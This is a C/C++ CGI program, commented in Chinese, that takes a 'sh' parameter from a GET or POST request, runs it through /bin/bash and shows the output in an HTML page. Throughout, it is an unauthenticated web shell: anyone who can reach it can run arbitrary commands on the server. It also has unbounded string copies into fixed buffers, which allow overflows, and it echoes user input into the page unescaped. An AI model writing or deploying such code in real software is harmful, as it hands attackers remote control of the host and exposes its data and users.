#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <iostream>
#include <string.h>
 
using namespace std;

//替换字符
void replace_string(char *result, char *source,const char *s1,const char *s2) {
	char *q=NULL;
    char *p=NULL;
    p=source;
    while((q=strstr(p, s1))!=NULL)
    {
        strncpy(result, p, q-p);
        result[q-p]= '\0';//very important, must attention!
        strcat(result, s2);
        strcat(result, q+strlen(s1));
        strcpy(p,result);
    }
    strcpy(result, p);    
}

/*
 * cmd：待执行命令
 * result：命令输出结果
 * 函数返回：0 成功；-1 失败；
 */
int ExecuteCMD(const char *cmd, char *result) {
    int iRet = -1;
    char buf_shell[1024];
    char shell[1024] = {0};
    FILE *fp;
    strcpy(shell, cmd);
    if((fp = popen(shell, "r")) != NULL)
    {
        while(fgets(buf_shell, sizeof(buf_shell), fp) != NULL)
        {
           strcat(result, buf_shell);
           if(strlen(result) > 1024)
           {
               break;
           }
        }
        pclose(fp);
        fp = NULL;
        iRet = 0;  // 处理成功
    }
    else
    {
        //printf("popen %s error\n", shell);
        iRet = -1; // 处理失败
    }
    return iRet;
}

int main() {

	char sh[1024];
	char tmp[1024];
	char src[1024];
	char shell[1024];
	char buff[1024]={0};
	char result[1024]={0};
	
	
	printf("Content-Type:text/html;charset=utf-8\r\n\r\n");
	// printf(getenv("REMOTE_HOST"));
	// printf(getenv("GATEWAY_INTERFACE")); //cgi协议的版本
	//printf(getenv("REQUEST_METHOD"));		//获取请求的方式
		if(!strcmp(getenv("REQUEST_METHOD"),"GET")) {
			//直接通过环境变量得到get的请求参数
			char *get=getenv("QUERY_STRING"); 	//获取get数据
			sscanf(get,"sh=%s",tmp);
			//替换出空格
			replace_string(sh,tmp,"%20"," ");
			//只用 bash 命令
			strcpy(shell, "/bin/bash ");
			strcat(shell, sh);
			//运行命令
			ExecuteCMD(shell,result);
			replace_string(buff,result,"\n","<br>");
			//printf("{\"shell\": \"%s\",\"result\": \"%s\"}",shell,result);
			std::cout << "<html>\n";
			std::cout << "<style>\n";
            std::cout << "legend{color: Black; font-size: 15px;}\n";
			std::cout << "</style>\n";
			std::cout << "<fieldset>\n";
			std::cout << "<legend>脚本位置：</legend>\n";
			std::cout << "<font color='red'size='5'>"<< tmp << "</font>\n";
			std::cout << "<br>\n";
			std::cout << "</fieldset>\n";
			std::cout << "<br><br>\n";
			std::cout << "<fieldset>\n";
			std::cout << "<legend>执行结果：</legend>\n";
			std::cout << "<font color='red'size='5'>"<< result << "</font>\n";
			std::cout << "<br><br>\n";
			std::cout << "</fieldset>\n";
			std::cout << "</html>\n";
			}
		if(!strcmp(getenv("REQUEST_METHOD"),"POST")) {
			/*获取post数据*/
			//post传送的数据在数据流中
			cin>>src;
			sscanf(src,"sh=%s",tmp);
			//替换出空格
			replace_string(sh,tmp,"%20"," ");
			//只用 bash 命令
			strcpy(shell, "/bin/bash ");
			strcat(shell, sh);
			//运行命令
			ExecuteCMD(shell,result);
			replace_string(buff,result,"\n","<br>");
			//printf("{\"shell\": \"%s\",\"result\": \"%s\"}",shell,result);
			std::cout << "<html>\n";
			std::cout << "<style>\n";
            std::cout << "legend{color: Black; font-size: 15px;}\n";
			std::cout << "</style>\n";
			std::cout << "<fieldset>\n";
			std::cout << "<legend>脚本位置：</legend>\n";
			std::cout << "<font color='red'size='5'>"<< tmp << "</font>\n";
			std::cout << "<br>\n";
			std::cout << "</fieldset>\n";
			std::cout << "<br><br>\n";
			std::cout << "<fieldset>\n";
			std::cout << "<legend>执行结果：</legend>\n";
			std::cout << "<font color='red'size='5'>"<< result << "</font>\n";
			std::cout << "<br><br>\n";
			std::cout << "</fieldset>\n";
			std::cout << "</html>\n";
			}
		return 0;
}